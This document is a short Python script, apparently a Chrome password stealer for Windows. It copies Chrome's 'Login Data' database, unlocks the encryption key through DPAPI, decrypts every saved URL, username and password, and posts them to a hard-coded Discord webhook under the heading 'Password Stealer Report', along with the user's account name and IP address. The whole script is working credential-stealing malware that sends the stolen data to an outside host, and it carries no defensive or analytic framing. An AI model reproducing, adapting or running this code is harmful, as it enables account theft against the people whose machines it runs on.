import os
import sqlite3
import win32crypt
import json
from base64 import b64decode
from Crypto.Cipher import AES
import requests
import getpass
import socket

def get_chrome_passwords():
    try:
        passwords = []
        login_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(login_db):
            return ["Chrome password database not found"]

        # Copy database to avoid locking
        temp_path = os.path.join(os.environ["TEMP"], "Login Data")
        with open(login_db, 'rb') as f:
            data = f.read()
        with open(temp_path, 'wb') as f:
            f.write(data)

        # Get encryption key
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        key = b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]  # Remove 'DPAPI' prefix
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        # Connect to database and query passwords
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, password in cursor.fetchall():
            if not username or not password:
                continue
            # Decrypt password
            try:
                iv = password[3:15]
                encrypted_password = password[15:-16]
                tag = password[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                decrypted_password = cipher.decrypt_and_verify(encrypted_password, tag).decode("utf-8")
                passwords.append(f"{url} | {username} | {decrypted_password}")
            except:
                continue
        conn.close()
        os.remove(temp_path)  # Clean up
        return passwords if passwords else ["No passwords found"]
    except Exception as e:
        return [f"Error: {str(e)}"]

def send_to_webhook(passwords):
    webhook_url = "https://discord.com/api/webhooks/1396114728497188955/el1tR6M760YCZYK4biJUev2L-Y8ZNEZjM_Frq0_8nBIkyTibJkyhDqSR599QBPr8L2kA"
    username = getpass.getuser()
    ip_address = socket.gethostbyname(socket.gethostname())
    data = {
        "content": f"**Password Stealer Report**\nUser: {username}\nIP: {ip_address}\n\n**Chrome Passwords**:\n" + "\n".join(passwords)
    }
    try:
        response = requests.post(webhook_url, json=data)
        return response.status_code == 204
    except Exception as e:
        return f"Webhook error: {str(e)}"

if __name__ == "__main__":
    passwords = get_chrome_passwords()
    send_to_webhook(passwords)
